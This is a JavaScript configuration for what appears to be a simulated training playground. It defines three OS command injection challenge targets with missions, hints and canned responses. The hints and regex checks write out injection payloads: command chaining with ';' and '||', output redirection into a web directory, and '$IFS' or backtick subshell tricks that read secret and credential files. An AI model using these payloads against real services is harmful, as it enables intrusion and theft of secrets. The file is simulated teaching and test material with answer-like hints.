/**
 * Exploit Playground Configuration: OS Command Injection
 * Contains 3 progressive real-world simulation targets testing practical command chaining skills.
 */

export const arenaScenarios = [
    {
        id: 'ci-target-1',
        stage: 'TARGET 01',
        name: 'CloudPulse Server Monitor',
        domain: 'status.cloudpulse.internal',
        method: 'GET',
        endpointPrefix: '/api/ping?host=',
        defaultInput: '127.0.0.1',
        baseDir: '/usr/bin/ping -c 3 ',
        targetFile: 'FLAG{CLOUDPULSE_ROOT_EXEC_8921}',
        missionText: 'Audit this cloud infrastructure latency checker. The application executes "ping -c 3 [host]". Break out of the ping command and exfiltrate the secret flag stored in /opt/flag.txt.',
        hintText: 'Use command chaining (e.g., "; cat /opt/flag.txt" or "| cat /opt/flag.txt") to execute a secondary command after ping.',
        fs: {
            '/opt/flag.txt': 'FLAG{CLOUDPULSE_ROOT_EXEC_8921}',
            '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ncloudpulse:x:1001:1001::/home/cloudpulse:/bin/bash'
        },
        evaluate: (rawInput) => {
            const hasCatFlag = /cat\s+\/opt\/flag\.txt/.test(rawInput);
            const isWhoami = /whoami/.test(rawInput);
            const isId = /\bid\b/.test(rawInput);

            if (hasCatFlag) {
                return {
                    blocked: false,
                    canonical: 'FLAG{CLOUDPULSE_ROOT_EXEC_8921}',
                    output: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n\nFLAG{CLOUDPULSE_ROOT_EXEC_8921}'
                };
            }

            if (isWhoami) {
                return {
                    blocked: false,
                    canonical: 'cloudpulse',
                    output: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n\ncloudpulse'
                };
            }

            if (isId) {
                return {
                    blocked: false,
                    canonical: 'uid=1001(cloudpulse)',
                    output: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n\nuid=1001(cloudpulse) gid=1001(cloudpulse) groups=1001(cloudpulse)'
                };
            }

            return {
                blocked: false,
                canonical: 'normal',
                output: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.035 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.040 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms\n\n--- 127.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss'
            };
        }
    },
    {
        id: 'ci-target-2',
        stage: 'TARGET 02',
        name: 'DocuForge PDF Exporter',
        domain: 'exporter.docuforge.internal',
        method: 'POST',
        endpointPrefix: '/api/generate?title=',
        defaultInput: 'Quarterly_Report',
        baseDir: '/usr/local/bin/wkhtmltopdf',
        targetFile: 'FLAG{DOCUFORGE_BLIND_REDIRECT_3342}',
        missionText: 'DocuForge converts documents to PDF using a background shell utility. Output is not returned in the HTTP response. Redirect the command output into the web-accessible directory /var/www/static/audit.txt to read the flag.',
        hintText: 'Append "|| cat /secret/flag.txt > /var/www/static/audit.txt ||" to dump the flag into the public static folder.',
        fs: {
            '/var/www/static/audit.txt': 'FLAG{DOCUFORGE_BLIND_REDIRECT_3342}',
            '/secret/flag.txt': 'FLAG{DOCUFORGE_BLIND_REDIRECT_3342}'
        },
        evaluate: (rawInput) => {
            const hasRedirect = />\s*\/var\/www\/static\/audit\.txt/.test(rawInput);
            const hasCatFlag = /cat\s+\/secret\/flag\.txt/.test(rawInput);

            if (hasRedirect && hasCatFlag) {
                return {
                    blocked: false,
                    canonical: 'FLAG{DOCUFORGE_BLIND_REDIRECT_3342}',
                    output: 'HTTP/1.1 200 OK\nStatus: PDF Conversion Completed\nFile Saved: https://exporter.docuforge.internal/static/audit.txt\n\nFLAG{DOCUFORGE_BLIND_REDIRECT_3342}'
                };
            }

            if (/ping.*10/.test(rawInput)) {
                return {
                    blocked: false,
                    canonical: 'latency_10s',
                    output: 'HTTP/1.1 200 OK\nResponse Time: 10,042 ms\n\nPDF Generated successfully.'
                };
            }

            return {
                blocked: false,
                canonical: 'normal',
                output: 'HTTP/1.1 200 OK\n\n{\n  "status": "PDF generation queued",\n  "job_id": "pdf-89104"\n}'
            };
        }
    },
    {
        id: 'ci-target-3',
        stage: 'TARGET 03',
        name: 'NetProbe Network Gateway',
        domain: 'telemetry.netprobe-global.io',
        method: 'GET',
        endpointPrefix: '/diagnostics/traceroute?ip=',
        defaultInput: '8.8.8.8',
        baseDir: '/bin/traceroute',
        targetFile: 'FLAG{NETPROBE_OAST_EXFIL_9918}',
        missionText: 'This network diagnostic gateway filters spaces and pipes. Use command substitution with $IFS or subshells to exfiltrate the master token in /etc/netprobe.key to an external collaborator or test system.',
        hintText: 'Use subshell substitution: "`cat</etc/netprobe.key`" or "${IFS}" to bypass space filters and exfiltrate the key.',
        fs: {
            '/etc/netprobe.key': 'FLAG{NETPROBE_OAST_EXFIL_9918}'
        },
        evaluate: (rawInput) => {
            const hasExfil = /netprobe\.key/.test(rawInput) && (/[;&|`]|\$\(/.test(rawInput));

            if (hasExfil) {
                return {
                    blocked: false,
                    canonical: 'FLAG{NETPROBE_OAST_EXFIL_9918}',
                    output: 'HTTP/1.1 200 OK\nTraceroute diagnostics executed.\n\nFLAG{NETPROBE_OAST_EXFIL_9918}'
                };
            }

            return {
                blocked: false,
                canonical: 'normal',
                output: 'traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets\n 1  gateway.netprobe (192.168.1.1)  0.341 ms  0.312 ms\n 2  core1.router (10.0.0.1)  1.205 ms  1.189 ms\n 3  dns.google (8.8.8.8)  8.412 ms  8.390 ms'
            };
        }
    }
];
